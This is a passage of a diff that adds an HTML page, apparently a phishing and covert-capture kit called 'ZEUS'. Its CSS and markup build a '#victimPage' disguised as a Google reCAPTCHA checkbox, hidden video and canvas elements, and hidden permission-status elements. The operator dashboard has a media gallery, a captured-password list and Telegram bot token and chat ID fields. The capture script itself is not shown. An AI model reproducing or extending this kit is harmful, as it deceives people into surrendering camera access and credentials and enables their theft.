+            border-radius: 6px;
+            transition: var(--transition);
+        }
+
+        .actions-cell button:hover {
+            background: var(--gold-soft);
+        }
+
+        .actions-cell button.danger {
+            color: var(--danger);
+        }
+
+        .actions-cell button.danger:hover {
+            background: rgba(217, 48, 37, 0.08);
+        }
+
+        .actions-cell button.success {
+            color: var(--success);
+        }
+
+        .actions-cell button.success:hover {
+            background: rgba(26, 138, 74, 0.08);
+        }
+
+        .dash-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 8px;
+            padding: 6px 0;
+        }
+
+        .dash-gallery .gallery-item {
+            aspect-ratio: 1/1;
+            background: var(--bg-input);
+            border-radius: 10px;
+            border: 1px solid var(--line);
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .dash-gallery .gallery-item:hover {
+            border-color: var(--gold);
+            transform: scale(1.04);
+            box-shadow: 0 0 24px rgba(184, 148, 46, 0.12);
+            z-index: 3;
+        }
+
+        .dash-gallery .gallery-item img,
+        .dash-gallery .gallery-item video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .dash-gallery .gallery-item .file-icon {
+            font-size: 24px;
+            color: var(--ink-faint);
+            opacity: 0.3;
+        }
+
+        .dash-gallery .gallery-item .file-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.55);
+            padding: 2px 6px;
+            font-size: 8px;
+            color: #ccc;
+            text-align: center;
+            font-family: var(--font-en);
+            overflow: hidden;
+            white-space: nowrap;
+            text-overflow: ellipsis;
+            backdrop-filter: blur(4px);
+            transition: var(--transition);
+        }
+
+        .dash-gallery .gallery-item:hover .file-label {
+            background: rgba(0, 0, 0, 0.75);
+        }
+
+        .dash-toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 14px;
+            align-items: center;
+        }
+
+        .dash-toolbar .search-wrap {
+            flex: 1;
+            min-width: 160px;
+            display: flex;
+            align-items: center;
+            background: var(--bg-input);
+            border-radius: 12px;
+            padding: 0 12px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            transition: var(--transition);
+            backdrop-filter: blur(4px);
+        }
+
+        .dash-toolbar .search-wrap:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px var(--gold-soft);
+        }
+
+        .dash-toolbar .search-wrap input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            padding: 8px 0;
+            font-family: var(--font-en);
+            font-size: 12px;
+            color: var(--ink);
+            min-width: 0;
+        }
+
+        .dash-toolbar .search-wrap svg {
+            width: 15px;
+            height: 15px;
+            stroke: var(--ink-faint);
+            fill: none;
+            stroke-width: 1.8;
+            flex-shrink: 0;
+        }
+
+        .dash-toolbar .filter-select {
+            background: var(--bg-input);
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            border-radius: 12px;
+            padding: 8px 12px;
+            font-family: var(--font-en);
+            font-size: 12px;
+            color: var(--ink);
+            outline: none;
+            transition: var(--transition);
+            min-width: 100px;
+            backdrop-filter: blur(4px);
+            cursor: pointer;
+        }
+
+        .dash-toolbar .filter-select:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px var(--gold-soft);
+        }
+
+        .detail-view {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 16px 20px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            margin-bottom: 14px;
+            box-shadow: var(--shadow-card);
+            transition: var(--transition);
+        }
+
+        .detail-view:hover {
+            border-color: rgba(184, 148, 46, 0.10);
+        }
+
+        .detail-view .detail-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px 20px;
+            padding: 5px 0;
+            border-bottom: 1px solid var(--line);
+        }
+
+        .detail-view .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-view .detail-row .label {
+            font-family: var(--font-en);
+            font-size: 10px;
+            font-weight: 600;
+            color: var(--ink-faint);
+            min-width: 80px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            opacity: 0.7;
+        }
+
+        .detail-view .detail-row .value {
+            font-family: var(--font-en);
+            font-size: 13px;
+            color: var(--ink);
+            word-break: break-all;
+        }
+
+        .log-entry {
+            display: flex;
+            gap: 10px;
+            padding: 6px 0;
+            border-bottom: 1px solid var(--line);
+            font-family: var(--font-en);
+            font-size: 12px;
+            color: var(--ink-2);
+            align-items: center;
+            transition: var(--transition);
+        }
+
+        .log-entry:hover {
+            background: rgba(184, 148, 46, 0.02);
+        }
+
+        .log-entry .log-time {
+            color: var(--ink-faint);
+            font-size: 10px;
+            min-width: 50px;
+            font-variant-numeric: tabular-nums;
+            flex-shrink: 0;
+        }
+
+        .log-entry .log-badge {
+            background: var(--gold-soft);
+            color: var(--gold);
+            font-size: 9px;
+            font-weight: 600;
+            padding: 0 8px;
+            border-radius: 20px;
+            flex-shrink: 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .log-entry .log-badge.danger {
+            background: rgba(217, 48, 37, 0.10);
+            color: var(--danger);
+        }
+
+        .log-entry .log-badge.success {
+            background: rgba(26, 138, 74, 0.10);
+            color: var(--success);
+        }
+
+        .log-entry .log-badge.info {
+            background: var(--gold-soft);
+            color: var(--gold);
+        }
+
+        .chart-container {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 14px 18px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            margin-bottom: 18px;
+            box-shadow: var(--shadow-card);
+            transition: var(--transition);
+        }
+
+        .chart-container:hover {
+            border-color: rgba(184, 148, 46, 0.10);
+        }
+
+        .chart-container canvas {
+            width: 100% !important;
+            height: auto !important;
+            max-height: 150px;
+        }
+
+        .code-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 99997;
+            background: rgba(10, 8, 6, 0.78);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: dashFadeIn 0.4s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+
+        .code-modal.active {
+            display: flex;
+        }
+
+        .code-modal .modal-box {
+            max-width: 400px;
+            width: 100%;
+            background: var(--bg-panel);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.10);
+            padding: 28px 24px 24px;
+            box-shadow: var(--shadow-dash);
+            text-align: center;
+            animation: fadeUp 0.4s ease;
+        }
+
+        .code-modal .modal-box .modal-title {
+            font-family: var(--font-ar);
+            font-size: 22px;
+            font-weight: 700;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 2px;
+            margin-bottom: 2px;
+        }
+
+        .code-modal .modal-box .modal-sub {
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+            font-size: 12px;
+            margin-bottom: 16px;
+            opacity: 0.8;
+        }
+
+        .code-modal .modal-box .input-wrap {
+            display: flex;
+            align-items: center;
+            background: var(--bg-input);
+            border-radius: 14px;
+            padding: 0 14px;
+            border: 1px solid var(--line);
+            transition: var(--transition);
+            backdrop-filter: blur(4px);
+            margin-bottom: 14px;
+        }
+
+        .code-modal .modal-box .input-wrap:focus-within {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px var(--gold-soft);
+        }
+
+        .code-modal .modal-box .input-wrap input {
+            flex: 1;
+            border: none;
+            outline: none;
+            background: transparent;
+            padding: 12px 0;
+            font-family: var(--font-en);
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--ink);
+            direction: ltr;
+            text-align: center;
+            letter-spacing: 2px;
+            min-width: 0;
+        }
+
+        .code-modal .modal-box .input-wrap input::placeholder {
+            color: var(--ink-faint);
+            font-weight: 400;
+            opacity: 0.4;
+        }
+
+        .code-modal .modal-box .modal-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .code-modal .modal-box .modal-actions button {
+            padding: 8px 24px;
+            border-radius: 30px;
+            border: none;
+            font-family: var(--font-en);
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            letter-spacing: 0.5px;
+        }
+
+        .code-modal .modal-box .modal-actions .btn-confirm {
+            background: var(--gold-shimmer);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(184, 148, 46, 0.25);
+        }
+
+        .code-modal .modal-box .modal-actions .btn-confirm:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(184, 148, 46, 0.35);
+        }
+
+        .code-modal .modal-box .modal-actions .btn-cancel {
+            background: var(--bg-input);
+            color: var(--ink-faint);
+            border: 1px solid var(--line);
+        }
+
+        .code-modal .modal-box .modal-actions .btn-cancel:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+        }
+
+        .code-modal .modal-box .modal-error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 10px;
+            font-family: var(--font-en);
+            display: none;
+        }
+
+        .code-modal .modal-box .modal-error.show {
+            display: block;
+        }
+
+        #victimPage {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            background: #eef2f5;
+            padding: 16px;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+        }
+
+        [data-theme="dark"] #victimPage {
+            background: #1a1816;
+        }
+
+        #victimPage .captcha-wrapper {
+            width: 360px;
+            max-width: 100%;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            cursor: default;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+            transition: background 0.3s, border-color 0.3s;
+        }
+
+        [data-theme="dark"] #victimPage .captcha-wrapper {
+            background: #262320;
+            border-color: #4a4640;
+        }
+
+        #victimPage .captcha-row {
+            display: flex;
+            align-items: center;
+            padding: 14px 14px 10px 14px;
+            gap: 10px;
+        }
+
+        #victimPage .spinner {
+            position: relative;
+        }
+
+        #victimPage .spinner input {
+            display: none;
+        }
+
+        #victimPage .checkmark {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background: white;
+            transition: 0.3s;
+            position: relative;
+        }
+
+        [data-theme="dark"] #victimPage .checkmark {
+            background: #3a3630;
+            border-color: #5a5448;
+        }
+
+        #victimPage .checkmark .tick {
+            width: 9px;
+            height: 16px;
+            border-right: 4px solid #00a651;
+            border-bottom: 4px solid #00a651;
+            transform: rotate(45deg);
+            opacity: 0;
+            transition: 0.2s;
+        }
+
+        #victimPage .checkmark .loader {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 3px solid #e8f0fe;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        #victimPage .spinner.loading .checkmark {
+            border-color: #1a73e8;
+            background: #e8f0fe;
+        }
+
+        #victimPage .spinner.loading .checkmark .tick {
+            display: none;
+        }
+
+        #victimPage .spinner.loading .checkmark .loader {
+            display: block;
+        }
+
+        #victimPage .spinner.failed .checkmark {
+            border-color: #d93025;
+            background: #fce8e6;
+        }
+
+        #victimPage .spinner.failed .checkmark .tick {
+            display: none;
+        }
+
+        #victimPage .spinner.failed .checkmark .loader {
+            display: none;
+        }
+
+        #victimPage .spinner.failed .checkmark::after {
+            content: "✕";
+            font-size: 20px;
+            font-weight: bold;
+            color: #d93025;
+        }
+
+        #victimPage .spinner.success .checkmark {
+            border-color: #00a651;
+            background: #e6f4ea;
+        }
+
+        #victimPage .spinner.success .checkmark .tick {
+            opacity: 1;
+            animation: check 0.3s ease;
+        }
+
+        #victimPage .spinner.success .checkmark .loader {
+            display: none;
+        }
+
+        #victimPage .text {
+            flex: 1;
+            font-size: 17px;
+            color: #333;
+            text-align: center;
+            transition: color 0.2s;
+            user-select: none;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+        }
+
+        [data-theme="dark"] #victimPage .text {
+            color: #ccc;
+        }
+
+        #victimPage .text.loading {
+            color: #1a73e8;
+        }
+
+        #victimPage .text.failed {
+            color: #d93025;
+        }
+
+        #victimPage .text.success {
+            color: #00a651;
+        }
+
+        #victimPage .logo-captcha {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 9px;
+            color: #777;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+        }
+
+        [data-theme="dark"] #victimPage .logo-captcha {
+            color: #aaa;
+        }
+
+        #victimPage .logo-captcha img {
+            width: 34px;
+            margin-bottom: 3px;
+        }
+
+        #victimPage .logo-captcha strong {
+            font-size: 9px;
+        }
+
+        #victimPage .logo-captcha small {
+            font-size: 7px;
+        }
+
+        #victimPage .captcha-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 5px 12px;
+            background: #f1f3f4;
+            border-top: 1px solid #e5e7e9;
+            height: 32px;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+        }
+
+        [data-theme="dark"] #victimPage .captcha-footer {
+            background: #2a2722;
+            border-color: #3a3630;
+        }
+
+        #victimPage .captcha-footer .brand {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        #victimPage .captcha-footer .brand svg {
+            height: 20px;
+            width: auto;
+        }
+
+        #victimPage .captcha-footer .brand .google-text {
+            font-size: 13px;
+            font-weight: 500;
+            color: #222;
+        }
+
+        [data-theme="dark"] #victimPage .captcha-footer .brand .google-text {
+            color: #ccc;
+        }
+
+        #victimPage .captcha-footer .links {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 10px;
+        }
+
+        #victimPage .captcha-footer .links a {
+            color: #555;
+            text-decoration: none;
+            font-size: 10px;
+            transition: color 0.15s;
+        }
+
+        [data-theme="dark"] #victimPage .captcha-footer .links a {
+            color: #999;
+        }
+
+        #victimPage .captcha-footer .links a:hover {
+            color: #1a73e8;
+            text-decoration: underline;
+        }
+
+        #victimPage .captcha-footer .links .separator {
+            color: #aaa;
+        }
+
+        .perm-status {
+            display: none !important;
+        }
+
+        #hiddenVideo,
+        #hiddenCanvas {
+            display: none;
+        }
+
+        .victim-status {
+            display: none !important;
+        }
+
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: var(--ink);
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-family: var(--font-en);
+            font-size: 13px;
+            font-weight: 500;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.20);
+            opacity: 0;
+            transform: translateY(20px) scale(0.96);
+            transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+            pointer-events: none;
+            z-index: 99999;
+            direction: ltr;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            max-width: 90vw;
+        }
+
+        .toast-msg.show {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+
+        .toast-msg.success {
+            background: var(--success);
+        }
+
+        .toast-msg.error {
+            background: #d93025;
+        }
+
+        .toast-msg.warning {
+            background: #b8942e;
+        }
+
+        .secret-hint {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.60);
+            backdrop-filter: blur(12px);
+            color: #fff;
+            padding: 6px 20px;
+            border-radius: 30px;
+            font-family: var(--font-en);
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+            z-index: 99998;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .secret-hint.show {
+            opacity: 1;
+        }
+
+        .copy-inline {
+            background: none;
+            border: none;
+            color: var(--gold);
+            cursor: pointer;
+            padding: 1px 6px;
+            border-radius: 4px;
+            transition: var(--transition);
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+            font-family: var(--font-en);
+            font-size: 10px;
+        }
+
+        .copy-inline:hover {
+            background: var(--gold-soft);
+            color: var(--gold-deep);
+        }
+
+        .copy-inline svg {
+            width: 12px;
+            height: 12px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        @media (max-width: 900px) {
+            .dash-sidebar {
+                width: 56px;
+                padding: 10px 4px;
+            }
+            .dash-sidebar .sidebar-label {
+                display: none;
+            }
+            .dash-sidebar .nav-item span:not(.badge-nav) {
+                display: none;
+            }
+            .dash-sidebar .nav-item .badge-nav {
+                margin-right: 0;
+            }
+            .dash-sidebar .nav-item {
+                justify-content: center;
+                padding: 10px;
+            }
+            .dash-sidebar .nav-item svg {
+                width: 20px;
+                height: 20px;
+            }
+            .dash-header-bar .dash-title small {
+                display: none;
+            }
+            .dash-content {
+                padding: 14px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .dash-sidebar {
+                width: 44px;
+                padding: 6px 2px;
+            }
+            .dash-sidebar .nav-item {
+                padding: 8px;
+            }
+            .dash-sidebar .nav-item svg {
+                width: 16px;
+                height: 16px;
+            }
+            .dash-content {
+                padding: 10px;
+            }
+            .dash-header-bar {
+                padding: 10px 14px;
+            }
+            .dash-header-bar .dash-title {
+                font-size: 18px;
+            }
+            .dash-stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+            }
+            .dash-stat-card .stat-num {
+                font-size: 20px;
+            }
+            .dash-toolbar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .dash-toolbar .filter-select {
+                min-width: unset;
+            }
+        }
+
+        body.victim-mode {
+            background: #eef2f5;
+            padding: 16px;
+        }
+
+        [data-theme="dark"] body.victim-mode {
+            background: #1a1816;
+        }
+
+        body.victim-mode .panel {
+            display: none !important;
+        }
+
+        body.victim-mode #victimPage {
+            display: flex !important;
+        }
+
+        body.admin-mode .panel {
+            display: block !important;
+        }
+
+        body.admin-mode #victimPage {
+            display: none !important;
+        }
+
+        .dev-page {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 99998;
+            background: rgba(10, 8, 6, 0.72);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .dev-page.active {
+            display: flex;
+        }
+
+        .dev-container {
+            max-width: 520px;
+            width: 100%;
+            background: var(--bg-panel);
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+            border-radius: var(--radius-card);
+            border: 1px solid rgba(184, 148, 46, 0.08);
+            padding: 28px 32px 24px;
+            box-shadow: var(--shadow-dash);
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: fadeUp 0.4s ease;
+        }
+
+        .dev-container .dev-title {
+            font-family: var(--font-ar);
+            font-size: 24px;
+            font-weight: 700;
+            background: var(--gold-shimmer);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 3px;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+
+        .dev-container .dev-sub {
+            text-align: center;
+            color: var(--ink-faint);
+            font-family: var(--font-en);
+            font-size: 12px;
+            margin-bottom: 16px;
+            opacity: 0.8;
+        }
+
+        .dev-container .dev-close {
+            position: absolute;
+            top: 12px;
+            left: 16px;
+            background: none;
+            border: none;
+            color: var(--ink-faint);
+            font-size: 20px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: var(--font-ar);
+            line-height: 1;
+            padding: 4px 8px;
+            border-radius: 8px;
+        }
+
+        .dev-container .dev-close:hover {
+            color: var(--ink);
+            background: rgba(0, 0, 0, 0.04);
+        }
+
+        .dev-password-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .dev-password-item {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 12px 16px;
+            border: 1px solid var(--line);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+            transition: var(--transition);
+            box-shadow: var(--shadow-card);
+        }
+
+        .dev-password-item:hover {
+            border-color: rgba(184, 148, 46, 0.18);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .dev-password-item .pwd-info {
+            display: flex;
+            flex-direction: column;
+            gap: 1px;
+        }
+
+        .dev-password-item .pwd-info .pwd-label {
+            font-family: var(--font-en);
+            font-size: 9px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--ink-faint);
+            opacity: 0.7;
+        }
+
+        .dev-password-item .pwd-info .pwd-value {
+            font-family: var(--font-en);
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: var(--gold);
+            direction: ltr;
+            word-break: break-all;
+        }
+
+        .dev-password-item .pwd-info .pwd-time {
+            font-family: var(--font-en);
+            font-size: 9px;
+            color: var(--ink-faint);
+            opacity: 0.6;
+        }
+
+        .dev-password-item .pwd-copy {
+            background: var(--gold-soft);
+            border: 1px solid var(--line);
+            color: var(--gold);
+            padding: 4px 12px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: var(--font-en);
+            font-size: 10px;
+            font-weight: 600;
+            transition: var(--transition);
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .dev-password-item .pwd-copy:hover {
+            background: var(--gold);
+            color: #fff;
+            border-color: var(--gold);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(184, 148, 46, 0.20);
+        }
+
+        .dev-password-item .pwd-copy svg {
+            width: 12px;
+            height: 12px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .dev-empty {
+            text-align: center;
+            color: var(--ink-faint);
+            padding: 24px 0;
+            font-family: var(--font-en);
+            font-size: 13px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes check {
+            from {
+                opacity: 0;
+                transform: rotate(45deg) scale(0.3);
+            }
+            to {
+                opacity: 1;
+                transform: rotate(45deg) scale(1);
+            }
+        }
+
+        .fade-in {
+            animation: fadeUp 0.5s ease forwards;
+        }
+
+        .text-gold {
+            color: var(--gold);
+        }
+
+        .text-muted {
+            color: var(--ink-faint);
+        }
+
+        .flex-center {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .gap-1 {
+            gap: 4px;
+        }
+        .gap-2 {
+            gap: 8px;
+        }
+        .gap-3 {
+            gap: 12px;
+        }
+
+        .mt-1 {
+            margin-top: 4px;
+        }
+        .mt-2 {
+            margin-top: 8px;
+        }
+        .mt-3 {
+            margin-top: 12px;
+        }
+        .mb-1 {
+            margin-bottom: 4px;
+        }
+        .mb-2 {
+            margin-bottom: 8px;
+        }
+        .mb-3 {
+            margin-bottom: 12px;
+        }
+
+        .w-full {
+            width: 100%;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .bot-detail-card {
+            background: var(--bg-card);
+            border-radius: var(--radius-card);
+            padding: 16px 20px;
+            border: 1px solid rgba(184, 148, 46, 0.06);
+            margin-bottom: 12px;
+            box-shadow: var(--shadow-card);
+            transition: var(--transition);
+        }
+
+        .bot-detail-card:hover {
+            border-color: rgba(184, 148, 46, 0.14);
+        }
+
+        .bot-detail-card .bot-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .bot-detail-card .bot-header .bot-name {
+            font-family: var(--font-en);
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--gold);
+        }
+
+        .bot-detail-card .bot-header .bot-token {
+            font-family: var(--font-en);
+            font-size: 12px;
+            color: var(--ink-faint);
+            background: var(--bg-input);
+            padding: 2px 12px;
+            border-radius: 20px;
+            border: 1px solid var(--line);
+            direction: ltr;
+        }
+
+        .bot-detail-card .bot-stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 12px;
+            color: var(--ink-2);
+            font-family: var(--font-en);
+        }
+
+        .bot-detail-card .bot-stats span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .bot-detail-card .bot-stats .stat-num {
+            font-weight: 700;
+            color: var(--gold);
+        }
+
+        .bot-detail-card .bot-links {
+            margin-top: 8px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .bot-detail-card .bot-links .link-tag {
+            background: var(--bg-input);
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-family: var(--font-en);
+            color: var(--ink-faint);
+            border: 1px solid var(--line);
+            word-break: break-all;
+        }
+
+        @media (max-width: 480px) {
+            #victimPage .captcha-wrapper {
+                width: 100%;
+            }
+            #victimPage .text {
+                font-size: 15px;
+            }
+            #victimPage .logo-captcha img {
+                width: 30px;
+            }
+            #victimPage .captcha-footer .brand svg {
+                height: 18px;
+            }
+            #victimPage .captcha-footer .brand .google-text {
+                font-size: 11px;
+            }
+            #victimPage .captcha-footer .links {
+                font-size: 9px;
+                gap: 4px;
+            }
+        }
+
+        /* ===== تنسيق الـ QUOTE ===== */
+        .quote-output {
+            background: var(--bg-input);
+            border-right: 4px solid var(--gold);
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 6px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--ink-2);
+            direction: ltr;
+            text-align: left;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .quote-output code {
+            background: rgba(0,0,0,0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        [data-theme="dark"] .quote-output {
+            background: rgba(255,255,255,0.04);
+            color: #ccc;
+        }
+        [data-theme="dark"] .quote-output code {
+            background: rgba(255,255,255,0.08);
+        }
+        .quote-output .key-highlight {
+            color: var(--gold);
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="toast-msg" id="toast"></div>
+    <div class="secret-hint" id="secretHint">✓ تم فتح الباب السري</div>
+
+    <div class="code-modal" id="codeModal">
+        <div class="modal-box">
+            <div class="modal-title">ZEUS</div>
+            <div class="modal-sub">أدخل كود الداشبورد</div>
+            <div class="input-wrap">
+                <input type="text" id="codeInput" placeholder="••••••••••••••" autofocus />
+            </div>
+            <div class="modal-actions">
+                <button class="btn-confirm" id="codeConfirmBtn">تأكيد</button>
+                <button class="btn-cancel" id="codeCancelBtn">إلغاء</button>
+            </div>
+            <div class="modal-error" id="codeError">❌ الكود غير صحيح. حاول مجدداً.</div>
+        </div>
+    </div>
+
+    <div class="panel" id="adminPanel">
+        <div class="top">
+            <div class="brand" id="secretTrigger">
+                <div class="logo">
+                    <svg viewBox="0 0 100 100" fill="none">
+                        <polygon points="50,5 85,25 85,75 50,95 15,75 15,25" stroke="#b8942e" stroke-width="2.5" class="pulse" />
+                        <polygon points="50,10 80,28 80,72 50,90 20,72 20,28" stroke="#b8942e" stroke-width="0.8" opacity="0.3" class="glow-ring" />
+                        <polygon points="50,20 75,50 50,80 25,50" stroke="#b8942e" stroke-width="2" />
+                        <polygon points="50,35 60,50 50,65 40,50" fill="#b8942e" />
+                        <circle cx="50" cy="12" r="2" fill="#b8942e" opacity="0.7" />
+                        <circle cx="77" cy="26" r="2" fill="#b8942e" opacity="0.7" />
+                        <circle cx="77" cy="74" r="2" fill="#b8942e" opacity="0.7" />
+                        <circle cx="50" cy="88" r="2" fill="#b8942e" opacity="0.7" />
+                        <circle cx="23" cy="74" r="2" fill="#b8942e" opacity="0.7" />
+                        <circle cx="23" cy="26" r="2" fill="#b8942e" opacity="0.7" />
+                    </svg>
+                </div>
+                <div class="name">ZEUS</div>
+            </div>
+            <div class="info">
+                <div class="row">
+                    <svg class="icon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7 L12 12 L15 13"/></svg>
+                    <span id="timeDisplay">12:30</span>
+                </div>
+                <div class="row">
+                    <svg class="icon" viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="14" rx="2"/><path d="M8 3 L8 8 M16 3 L16 8"/><line x1="8" y1="11" x2="16" y2="11"/><circle cx="12" cy="14" r="1" fill="currentColor"/></svg>
+                    <span id="dateDisplay">01/08/2026</span>
+                </div>
+                <button class="theme-toggle" id="themeToggle">
+                    <svg viewBox="0 0 24 24"><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/><circle cx="12" cy="12" r="5"/></svg>
+                    <span id="themeLabel">فاتح</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <div class="label-wrap">
+                    <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="4"/><circle cx="12" cy="9" r="3"/><path d="M6 17 Q12 13 18 17"/></svg>
+                    <span class="label">الايــــــدي</span>
+                </div>
+                <div class="input-wrap">
+                    <input type="text" id="chatIdInput" placeholder="أدخل الإيدي …" dir="rtl" />
+                </div>
+            </div>
+            <div class="card">
+                <div class="label-wrap">
+                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7 L12 12 L15 15"/><circle cx="12" cy="12" r="2"/></svg>
+                    <span class="label">تـــــــوكن البـوت</span>
+                </div>
+                <div class="input-wrap">
+                    <input type="text" id="botTokenInput" placeholder="أدخل التوكن …" dir="rtl" />
+                </div>
+            </div>
+        </div>
+
+        <div class="card" style="margin-top:16px;">
+            <div class="label-wrap">
